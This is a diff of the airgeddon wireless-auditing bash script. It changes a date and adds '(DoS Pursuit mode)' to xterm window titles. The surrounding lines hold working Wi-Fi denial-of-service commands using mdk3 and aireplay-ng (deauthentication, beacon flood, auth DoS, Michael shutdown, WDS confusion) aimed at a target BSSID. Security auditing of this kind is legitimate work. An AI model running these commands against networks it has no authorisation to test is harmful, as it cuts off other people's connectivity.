@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20171108
+#Date.........: 20171110
 #Version......: 7.23
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
@@ -2849,57 +2849,57 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
 		;;
 		"wids / wips / wds confusion attack")
 			dos_delay=10
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"beacon flood attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
 		;;
 		"auth dos attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
 		;;
 		"michael shutdown attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
 		;;
 		"Mdk3")
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "mdk3 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
 		;;
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
 			iwconfig "${interface_pursuit_mode_deauth}" channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
 		;;
 		"Wds Confusion")
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "mdk3 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
 		;;
 	esac
 
